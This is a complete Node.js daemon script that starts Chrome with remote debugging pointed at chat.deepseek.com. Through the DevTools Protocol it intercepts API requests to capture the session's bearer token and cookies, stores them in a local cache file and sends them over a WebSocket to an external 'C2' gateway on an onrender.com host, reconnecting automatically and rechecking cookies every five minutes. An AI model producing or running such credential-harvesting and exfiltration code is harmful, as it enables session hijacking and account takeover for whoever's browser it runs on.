const WebSocket = require('ws');
const { spawn, execSync } = require('child_process');
const path = require('path');
const os = require('os');
const fs = require('fs');
const http = require('http');

// ─── CONFIG ───
const C2_WS = 'wss://carlos-gateway.onrender.com/c2/ws';
const USER_DATA_DIR = path.join(os.homedir(), 'AppData', 'Local', 'DeepSeek-C2-Runner');
const DEEPSEEK_URL = 'https://chat.deepseek.com';
const AUTH_CACHE_PATH = path.join(USER_DATA_DIR, '.auth-cache.json');
const PID_FILE = path.join(USER_DATA_DIR, 'runner.pid');
const LOG_FILE = path.join(USER_DATA_DIR, 'runner.log');
const CDP_PORT = 9222;

// ─── STATE ───
let ws = null;
let cdpWs = null;
let chromeProcess = null;
let authCaptured = false;
let capturedAuth = { bearer: '', cookies: '' };
let reconnectTimer = null;

// ─── LOGGING ───
function logToFile(msg) {
  try {
    const line = `[${new Date().toISOString()}] ${msg}\n`;
    fs.appendFileSync(LOG_FILE, line);
  } catch (e) {}
}

const origLog = console.log;
const origError = console.error;
console.log = (...args) => { origLog(...args); logToFile(args.join(' ')); };
console.error = (...args) => { origError(...args); logToFile(args.join(' ')); };

// ─── DAEMON MODE ───
function parseArgs() {
  return { cmd: (process.argv.slice(2)[0] || 'start') };
}

function writePid() {
  try { fs.mkdirSync(path.dirname(PID_FILE), { recursive: true }); fs.writeFileSync(PID_FILE, process.pid.toString()); } catch (e) {}
}
function readPid() { try { return parseInt(fs.readFileSync(PID_FILE, 'utf8').trim()); } catch (e) { return null; } }
function removePid() { try { fs.unlinkSync(PID_FILE); } catch (e) {} }
function isRunning(pid) { try { process.kill(pid, 0); return true; } catch (e) { return false; } }

function daemonStart() {
  const pid = readPid();
  if (pid && isRunning(pid)) { console.log(`[Runner] Already running (PID ${pid})`); process.exit(0); }
  removePid(); writePid();
  console.log(`[Runner] Started as daemon (PID ${process.pid})`);
  process.on('SIGINT', () => { cleanup(); process.exit(0); });
  process.on('SIGTERM', () => { cleanup(); process.exit(0); });
  process.on('exit', () => { removePid(); });
  run();
}

function daemonStop() {
  const pid = readPid();
  if (!pid) { console.log('[Runner] Not running'); process.exit(1); }
  if (!isRunning(pid)) { console.log('[Runner] Not running (stale)'); removePid(); process.exit(1); }
  process.kill(pid, 'SIGTERM');
  let waited = 0;
  const check = setInterval(() => {
    if (!isRunning(pid) || waited > 5000) { clearInterval(check); removePid(); console.log('[Runner] Stopped'); process.exit(0); }
    waited += 100;
  }, 100);
}

function daemonStatus() {
  const pid = readPid();
  if (!pid || !isRunning(pid)) { console.log('[Runner] NOT RUNNING'); if (pid) removePid(); process.exit(1); }
  console.log(`[Runner] RUNNING (PID ${pid})`);
  console.log(`[Runner] C2: ${ws?.readyState === WebSocket.OPEN ? 'connected' : 'disconnected'}`);
  console.log(`[Runner] Auth: ${authCaptured ? 'YES' : 'NO'}`);
  process.exit(0);
}

function cleanup() {
  if (cdpWs) try { cdpWs.close(); } catch (e) {}
  if (ws) try { ws.close(); } catch (e) {}
  if (chromeProcess) try { chromeProcess.kill(); } catch (e) {}
  removePid();
}

// ─── AUTH PERSISTENCE ───
function saveAuth() {
  try { fs.mkdirSync(path.dirname(AUTH_CACHE_PATH), { recursive: true }); fs.writeFileSync(AUTH_CACHE_PATH, JSON.stringify(capturedAuth)); } catch (e) {}
}

function loadAuth() {
  try {
    if (fs.existsSync(AUTH_CACHE_PATH)) {
      const data = JSON.parse(fs.readFileSync(AUTH_CACHE_PATH, 'utf8'));
      if (data.bearer) { capturedAuth = data; authCaptured = true; console.log('[Runner] Auth restored from cache'); return true; }
    }
  } catch (e) {}
  return false;
}

function sendAuthToGateway() {
  if (ws?.readyState === WebSocket.OPEN && authCaptured && capturedAuth.bearer) {
    ws.send(JSON.stringify({ type: 'auth', bearer: capturedAuth.bearer, cookies: capturedAuth.cookies }));
    console.log('[Runner] Auth sent to gateway');
  }
}

// ─── FIND CHROME ───
function findChrome() {
  const candidates = [
    // Windows
    path.join(process.env['PROGRAMFILES'] || '', 'Google', 'Chrome', 'Application', 'chrome.exe'),
    path.join(process.env['PROGRAMFILES(X86)'] || '', 'Google', 'Chrome', 'Application', 'chrome.exe'),
    path.join(process.env['LOCALAPPDATA'] || '', 'Google', 'Chrome', 'Application', 'chrome.exe'),
    // Linux
    '/usr/bin/google-chrome',
    '/usr/bin/google-chrome-stable',
    '/usr/bin/chromium-browser',
    '/usr/bin/chromium',
    // macOS
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
  ];
  for (const p of candidates) {
    if (fs.existsSync(p)) return p;
  }
  // Fallback: try where
  try {
    if (os.platform() === 'win32') {
      return execSync('where chrome', { encoding: 'utf8' }).trim().split('\n')[0];
    } else {
      return execSync('which google-chrome || which chromium-browser || which chromium', { encoding: 'utf8' }).trim();
    }
  } catch (e) {}
  return null;
}

// ─── LAUNCH CHROME WITH CDP ───
function launchChrome() {
  const chromePath = findChrome();
  if (!chromePath) {
    console.error('[Runner] Chrome not found. Install Google Chrome.');
    process.exit(1);
  }
  console.log('[Runner] Chrome:', chromePath);

  fs.mkdirSync(USER_DATA_DIR, { recursive: true });

  const args = [
    `--remote-debugging-port=${CDP_PORT}`,
    `--user-data-dir=${USER_DATA_DIR}`,
    '--no-first-run',
    '--no-default-browser-check',
    '--window-position=100,50',
    '--window-size=1440,900',
    DEEPSEEK_URL,
  ];

  chromeProcess = spawn(chromePath, args, { detached: true, stdio: 'ignore' });
  chromeProcess.unref();
  console.log('[Runner] Chrome launched (PID', chromeProcess.pid, ')');
}

// ─── CDP NETWORK INTERCEPTION ───
async function connectCDP() {
  // Get the CDP WebSocket endpoint
  return new Promise((resolve, reject) => {
    const checkAttempt = (attempt) => {
      if (attempt > 20) { reject(new Error('CDP not available after 20 attempts')); return; }
      http.get(`http://127.0.0.1:${CDP_PORT}/json`, res => {
        let data = '';
        res.on('data', c => data += c);
        res.on('end', () => {
          try {
            const tabs = JSON.parse(data);
            const page = tabs.find(t => t.type === 'page');
            if (page && page.webSocketDebuggerUrl) {
              console.log('[Runner] CDP connected');
              setupCDPListener(page.webSocketDebuggerUrl);
              resolve();
            } else {
              setTimeout(() => checkAttempt(attempt + 1), 1000);
            }
          } catch (e) {
            setTimeout(() => checkAttempt(attempt + 1), 1000);
          }
        });
      }).on('error', () => {
        setTimeout(() => checkAttempt(attempt + 1), 1000);
      });
    };
    checkAttempt(0);
  });
}

function setupCDPListener(wsUrl) {
  cdpWs = new WebSocket(wsUrl);
  let msgId = 1;

  cdpWs.on('open', () => {
    // Enable network interception
    cdpWs.send(JSON.stringify({ id: msgId++, method: 'Network.enable', params: {} }));
    console.log('[Runner] CDP Network listener active');
  });

  cdpWs.on('message', data => {
    try {
      const msg = JSON.parse(data.toString());

      // Capture request headers from DeepSeek API calls
      if (msg.method === 'Network.requestWillBeSent') {
        const url = msg.params?.request?.url || '';
        if (!url.startsWith('https://chat.deepseek.com/api/')) return;

        const headers = msg.params?.request?.headers || {};

        // Capture bearer
        const auth = headers['Authorization'] || headers['authorization'] || '';
        const bearer = auth.replace('Bearer ', '');
        if (bearer && bearer.length > 50 && bearer !== capturedAuth.bearer) {
          capturedAuth.bearer = bearer;
          console.log('[Runner] Bearer captured:', bearer.slice(0, 20) + '...');
        }

        // Capture cookies
        const cookieHeader = headers['Cookie'] || headers['cookie'] || '';
        if (cookieHeader && cookieHeader.length > 50 && cookieHeader !== capturedAuth.cookies) {
          capturedAuth.cookies = cookieHeader;
          console.log('[Runner] Cookies captured');
        }

        if (!authCaptured && capturedAuth.bearer && capturedAuth.cookies) {
          authCaptured = true;
          saveAuth();
          console.log('[Runner] Auth complete, sending to gateway');
          sendAuthToGateway();
        }
      }
    } catch (e) {}
  });

  cdpWs.on('close', () => {
    console.log('[Runner] CDP disconnected, reconnecting...');
    setTimeout(() => connectCDP(), 2000);
  });

  cdpWs.on('error', e => console.error('[Runner] CDP error:', e.message));
}

// ─── MAIN RUN ───
async function run() {
  console.log('[Runner] Starting (no playwright, Chrome direct)...');

  // Load cached auth
  loadAuth();

  // Launch Chrome with CDP
  launchChrome();

  // Wait a bit for Chrome to start, then connect CDP
  await new Promise(r => setTimeout(r, 3000));
  try {
    await connectCDP();
  } catch (e) {
    console.error('[Runner] CDP connect failed:', e.message);
    console.log('[Runner] Retrying in 5s...');
    await new Promise(r => setTimeout(r, 5000));
    await connectCDP();
  }

  // Connect C2 WebSocket
  connectC2();

  // Keep alive ping
  setInterval(() => {
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'ping' }));
    }
  }, 30000);

  // Periodic auth refresh check (every 5 min)
  setInterval(() => {
    if (!authCaptured) return;
    // Auth check via CDP — navigate and check if still logged in
    if (cdpWs?.readyState === WebSocket.OPEN) {
      cdpWs.send(JSON.stringify({
        id: 9999,
        method: 'Runtime.evaluate',
        params: { expression: 'document.cookie' }
      }));
    }
  }, 5 * 60 * 1000);
}

// ─── C2 WEBSOCKET ───
function connectC2() {
  if (reconnectTimer) clearTimeout(reconnectTimer);

  console.log('[Runner] Connecting to C2:', C2_WS);
  ws = new WebSocket(C2_WS);

  ws.on('open', () => {
    console.log('[Runner] C2 connected');
    ws.send(JSON.stringify({ type: 'register', role: 'runner' }));
    sendAuthToGateway();
  });

  ws.on('message', data => {
    try { JSON.parse(data.toString()); } catch (e) {}
  });

  ws.on('close', () => {
    console.log('[Runner] C2 disconnected, reconnecting in 5s...');
    reconnectTimer = setTimeout(connectC2, 5000);
  });

  ws.on('error', e => console.error('[Runner] C2 error:', e.message));
}

// ─── ENTRY ───
const { cmd } = parseArgs();
switch (cmd) {
  case 'start': daemonStart(); break;
  case 'stop': daemonStop(); break;
  case 'status': daemonStatus(); break;
  default: console.log('Usage: node runner.js {start|stop|status}'); process.exit(1);
}
